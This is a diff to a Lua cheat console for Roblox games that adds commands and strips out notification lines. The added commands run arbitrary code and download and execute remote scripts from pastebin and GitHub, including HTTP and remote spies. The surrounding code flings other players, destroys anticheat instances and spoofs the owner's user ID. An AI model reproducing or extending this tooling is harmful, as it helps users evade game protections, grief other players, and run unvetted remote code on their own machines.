@@ -82,21 +82,20 @@ cmd.add("goto","Teleports you to another player's location.",function(name)
 
 	if getPlr(name) then
 		pc:PivotTo(getPlr(name).Character:GetPivot())
-		notify("Teleported to "..name.."!","TERMINAL","631727248")
 	end
 end)
 cmd.add("blackhole","Picks up every part near you.",function()
 	if rawequal(alreadyblackhole,false) then
 		alreadyblackhole = true
-		notify("blackhole activated!11","TERMINAL","10198213112")
 		pcall(function()
 			task.spawn(function()
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/YingXiangLing/1.0/main/Chaos.lua"))()
 			end)
 		end)
-	else
-		notify("cannot activate blackhole!11","TERMINAL","17840065045")
 	end
+end)
+cmd.add("source","Runs the selected code.",function(code)
+loadstring(code)()
 end)
 cmd.add("cmds","Shows all of the commands TERMINAL has.",function()
 	notify("Say /console in chat or press F9 to see commands.","TERMINAL","18514484572")
@@ -107,6 +106,18 @@ cmd.add("cmds","Shows all of the commands TERMINAL has.",function()
 		end
 	end)
 	print("Commands: "..finishedlist)
+end)
+cmd.add("wallwalk","makes you walk on walls",function()
+ loadstring(game:HttpGet("https://pastebin.com/raw/s4FjP97j"))()
+end)
+cmd.add("httpspy","Executes http spy.", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/HttpSpy'))()
+ end)
+cmd.add("remotespy","Executes remote spy.",function()
+loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
+end)
+cmd.add("gravity","Sets workspace gravity value to [number].",function(gravity)
+workspace.Gravity = gravity
 end)
 cmd.add("swordreach","Adds extra range to your sword.",function()
 	pcall(function()
@@ -127,10 +138,8 @@ cmd.add("swordreach","Adds extra range to your sword.",function()
 		Tool.Handle.Massless = true
 		Tool.Handle.Size = Vector3.new(reachsize,reachsize,reachsize)
 	end)
-	notify("extra 40 studs added to yo sword range!11","TERMINAL","15377165109")
 end)
 cmd.add("revive",'"No... ill never give up. I HAVE THE POWER OF FRIENDSHIP!!!" ahh command, anyway this might not work though',function(t)
-	notify("lol ok now reviving you if you die, MIGHT or might not work","TERMINAL","12916194667")
 	local Older;Older=pc:FindFirstChildOfClass("Humanoid").Health
 	local reload = true
 	task.spawn(function()
@@ -166,7 +175,6 @@ cmd.add("revive",'"No... ill never give up. I HAVE THE POWER OF FRIENDSHIP!!!" a
 			pc:FindFirstChildOfClass("Humanoid").Parent = game.ReplicatedStorage
 			game.ReplicatedStorage:FindFirstChild("Humanoid").Parent = pc
 			if r<=5 then
-				notify("you live to see another day, btw this command only works once per life!11","Reviver","9819687855")
 				idk:Disconnect()
 				delay(0.02,function()
 					reload = false
@@ -233,19 +241,16 @@ end)
 cmd.add("print","Prints text in the console.",print)
 cmd.add("sit","Sit.",function()
 	pc:FindFirstChildOfClass("Humanoid").Sit = true
-	notify("sit.","TERMINAL","16357820944")
 end)
 cmd.add("reset","die die die die die die die die",function()
 	pc:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Dead,true)
 	pc:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
-	notify("dei","TERMINAL","6656885176")
 end)
 cmd.add("fling","Flings your target lol.",function(name)
 	local Players = game.Players
 	local plr = p
 	local function Fling(TargetName)
 		if Players:FindFirstChild(TargetName) then
-			notify("Now flinging "..name.."!","TERMINAL","15412899776")
 			local oldpos;oldpos=plr.Character:FindFirstChild("HumanoidRootPart").CFrame
 			local HRP = plr.Character:FindFirstChild("HumanoidRootPart")
 			HRP.Transparency = 0.5
@@ -322,17 +327,15 @@ cmd.add("fling","Flings your target lol.",function(name)
 			if name ~= tostring(p.Name) then
 				Fling(getPlr(name).Name)
 			else
-				notify("why are you trying to fling yourself","TERMINAL","7202430493")
 			end
 		else
-			notify("no, i cannot fling people while you are r15.","TERMINAL","7202430493")
+			notify("R15 does not work on HYPERFLING.","TERMINAL","7202430493")
 		end
 	end)
 end)
 cmd.add("ui","Gives you ultra instinct lmao, you might get hit if you use false, it will stop combos by teleporting away though. But true just runs away from anyone near you",function(dclo)
 
 	if dclo ~= nil and rawequal(dclo:lower(),"true") then
-		notify("Now dodging attacks, MasteredUI: true","TERMINAL","7713850578")
 		repeat
 			task.wait()
 			for _, v in ipairs(game.Players:GetPlayers()) do
@@ -344,7 +347,6 @@ cmd.add("ui","Gives you ultra instinct lmao, you might get hit if you use false,
 			end
 		until pc:FindFirstChildOfClass("Humanoid").Health <= 0
 	elseif rawequal(dclo,nil) or rawequal(dclo:lower(),"false") then
-		notify("Now dodging attacks, MasteredUI: false","TERMINAL","9819687855")
 		local Older;Older=pc:FindFirstChildOfClass("Humanoid").Health
 		task.spawn(function()
 			repeat
@@ -368,7 +370,6 @@ cmd.add("unairwalk","Turns off airwalk.", function()
 			v:Destroy()
 		end
 	end
-	notify("Disabled airwalk!","TERMINAL","16218447187")
 end)
 cmd.add("airwalk","Turns on airwalk.",function()
 	task.spawn(function()
@@ -387,7 +388,6 @@ cmd.add("airwalk","Turns on airwalk.",function()
 				wait (.1)
 			end
 		end
-		notify("Enabled airwalk!","TERMINAL","16218447187")
 		AirWalk()
 	end)
 end)
@@ -419,7 +419,6 @@ cmd.add("toolfling","Makes one of your tools fling a player to oblivion on touch
 	end)
 end)
 cmd.add("unwalkfling","Disables walkfling.",function()
-	notify("Disabled walkfling!","TERMINAL","12260174010")
 	pcall(function()
 		hiddenfling = false
 	end)
@@ -427,9 +426,7 @@ end)
 cmd.add("walkfling","Enables walkfling, credits to nameless admin's walkfling.",function()
 	if game:GetService("ReplicatedStorage"):FindFirstChild("juisdfj0i32i0eidsuf0iok") then
 		hiddenfling = true
-		notify("Enabled walkfling!","TERMINAL","12260174010")
 	else
-		notify("Enabled walkfling!","TERMINAL","12260174010")
 		hiddenfling = true
 		local detection = Instance.new("Decal")
 		detection.Name = "juisdfj0i32i0eidsuf0iok"
@@ -468,7 +465,6 @@ end)
 cmd.add("view","Lets you view someone.",function(name)
 	local target = getPlr(name)
 	if target then
-		notify("Now viewing "..target.Name.."!","TERMINAL")
 		local targetc = target.Character
 		workspace.CurrentCamera.CameraSubject = targetc.Humanoid
 	end
@@ -476,7 +472,6 @@ end)
 cmd.add("unview","Changes your camera back to normal.",function()
 	local target = p
 	if target then
-		notify("Stopped the view command.","TERMINAL")
 		local targetc = target.Character
 		workspace.CurrentCamera.CameraSubject = targetc.Humanoid
 	end
@@ -484,7 +479,6 @@ end)
 cmd.add("cffling","Flings someone using CFrame.",function(name)
 	local target = getPlr(name)
 	if target then
-		notify("Now CFrame flinging "..target.Name.."!","TERMINAL")
 		local targetc = target.Character
 		local done = false
 		local opos;opos = pc:GetPivot()
@@ -554,7 +548,6 @@ cmd.add("ownerid","Changes your userid to the owner's userid (CLIENT)",function(
 end)
 cmd.add("speed","Changes your walkspeed to the specified number, use this with noanti to maximize its potential.",function(num)
 	pc:FindFirstChildOfClass("Humanoid").WalkSpeed = num
-	notify("Successfully set walkspeed to "..num.."!","TERMINAL","17821867294")
 end)
 cmd.add("noanti","Attempts to destroy every anticheat instance, this might break the game.",function()
 	local Instances = 0
@@ -568,18 +561,147 @@ cmd.add("noanti","Attempts to destroy every anticheat instance, this might break
 			end
 		end
 	end
-	task.wait()
-	notify("Removed "..Instances.." anticheat scripts.","TERMINAL","12976103126")
 end)
+local speedofthefly = 10
+local speedofthevfly = 10
+local FLYING = false
+function sFLY(vfly)
+	local p = game.Players.LocalPlayer
+	 cmdm = plr:GetMouse()
+	 FLYING = false
+	 speedofthefly = 10
+	 speedofthevfly = 10
+	 while not p or not p.Character or not p.Character:FindFirstChild('HumanoidRootPart') or not p.Character:FindFirstChild('Humanoid') or not cmdm do
+		  wait()
+	 end 
+	 local T = p.Character.HumanoidRootPart
+	 local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
+	 local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
+	 local SPEED = 0
+	 local function FLY()
+		 FLYING = true
+		 local BG = Instance.new('BodyGyro', T)
+		 local BV = Instance.new('BodyVelocity', T)
+		 BG.P = 9e4
+		 BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+		 BG.cframe = T.CFrame
+		 BV.velocity = Vector3.new(0, 0, 0)
+		 BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
+		 spawn(function()
+			 while FLYING do
+				 if not vfly then
+					 p.Character:FindFirstChild("Humanoid").PlatformStand = true
+				 end
+				 if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
+					 SPEED = 50
+				 elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
+					 SPEED = 0
+				 end
+				 if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
+					 BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
+					 lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
+				 elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
+					 BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
+				 else
+					 BV.velocity = Vector3.new(0, 0, 0)
+				 end
+				 BG.cframe = workspace.CurrentCamera.CoordinateFrame
+				 wait()
+			 end
+			 CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
+			 lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
+			 SPEED = 0
+			 BG:destroy()
+			 BV:destroy()
+			 p.Character.Humanoid.PlatformStand = false
+		 end)
+	 end
+	 cmdm.KeyDown:connect(function(KEY)
+		 if KEY:lower() == 'w' then
+			 if vfly then
+				 CONTROL.F = speedofthevfly
+			 else
+				 CONTROL.F = speedofthefly
+			 end
+		 elseif KEY:lower() == 's' then
+			 if vfly then
+				 CONTROL.B = - speedofthevfly
+			 else
+				 CONTROL.B = - speedofthefly
+			 end
+		 elseif KEY:lower() == 'a' then
+			 if vfly then
+				 CONTROL.L = - speedofthevfly
+			 else
+				 CONTROL.L = - speedofthefly
+			 end
+		 elseif KEY:lower() == 'd' then
+			 if vfly then
+				 CONTROL.R = speedofthevfly
+			 else
+				 CONTROL.R = speedofthefly
+			 end
+		 elseif KEY:lower() == 'y' then
+			 if vfly then
+				 CONTROL.Q = speedofthevfly*2
+			 else
+				 CONTROL.Q = speedofthefly*2
+			 end
+		 elseif KEY:lower() == 't' then
+			 if vfly then
+				 CONTROL.E = -speedofthevfly*2
+			 else
+				 CONTROL.E = -speedofthefly*2
+			 end
+		 end
+	 end)
+	 cmdm.KeyUp:connect(function(KEY)
+		 if KEY:lower() == 'w' then
+			 CONTROL.F = 0
+		 elseif KEY:lower() == 's' then
+			 CONTROL.B = 0
+		 elseif KEY:lower() == 'a' then
+			 CONTROL.L = 0
+		 elseif KEY:lower() == 'd' then
+			 CONTROL.R = 0
+		 elseif KEY:lower() == 'y' then
+			 CONTROL.Q = 0
+		 elseif KEY:lower() == 't' then
+			 CONTROL.E = 0
+		 end
+	 end)
+	 FLY()
+ end
+ cmd.add("fly","Lets you fly.", function(...)
+ FLYING = false
+	 p.Character.Humanoid.PlatformStand = false
+	 wait()
+ 
+		 
+		 
+		 wait();
+	 sFLY(true)
+	 speedofthevfly = (...)
+	 if (...) == nil then
+		 speedofthevfly = 2
+		 end
+end)
+ 
+cmd.add({"unfly"}, {"unfly", "Disable flight"}, function()
+ 
+		 
+		 
+		 wait();
+ FLYING = false
+	 p.Character.Humanoid.PlatformStand = false
+ end)
 cmd.add("clip", "Stops the noclip command.", function()
 	Noclip:Disconnect()
 	Noclip = nil
 	pc:FindFirstChildOfClass("Humanoid").Parent = game.ReplicatedStorage
 	game.ReplicatedStorage:FindFirstChild("Humanoid").Parent = pc
-	notify("Disabled noclip!","TERMINAL","13501428865")
 end)
 cmd.add("noclip","Makes you able to phase trough walls",function()
-	if rawequal(Noclip,nil) then notify("Activated noclip!","TERMINAL","13501428865") else notify("You are already using noclip!","TERMINAL","15387802901") return end
 	Noclip = game:GetService("RunService").Stepped:Connect(function()
 		for i, v in pairs(pc:GetDescendants()) do
 			if v:IsA("BasePart") then
